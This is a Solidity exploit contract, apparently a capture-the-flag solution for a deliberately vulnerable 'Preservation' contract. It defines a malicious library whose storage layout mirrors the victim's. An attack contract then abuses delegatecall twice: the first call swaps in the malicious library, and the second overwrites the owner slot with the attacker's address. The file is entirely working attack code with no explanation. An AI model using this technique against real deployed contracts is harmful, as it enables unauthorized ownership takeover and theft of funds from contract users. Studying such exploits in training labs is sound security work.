// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;
import "../../src/Preservation/Preservation.sol";

contract MaliciousLibrary {
    // Match storage slots with Preservation contract
    address public slot0; // storage slot 0
    address public slot1; // storage slot 1
    address public owner; // storage slot 2

    function setTime(uint256 _time) public {
        owner = msg.sender;
    }
}

contract PreservationExploit {
    Preservation victim;

    constructor(address _victim) {
        victim = Preservation(payable(_victim));
    }

    function hack() public {
        // Deploy the malicious library contract
        MaliciousLibrary maliciousLib = new MaliciousLibrary();

        // Use setFirstTime to set timeZone1Library to address of maliciousLib
        victim.setFirstTime(uint256(uint160(address(maliciousLib))));

        // Now when we call setFirstTime, it will execute maliciousLib's setTime via delegatecall
        victim.setFirstTime(0);
    }

    receive() external payable {
    }
}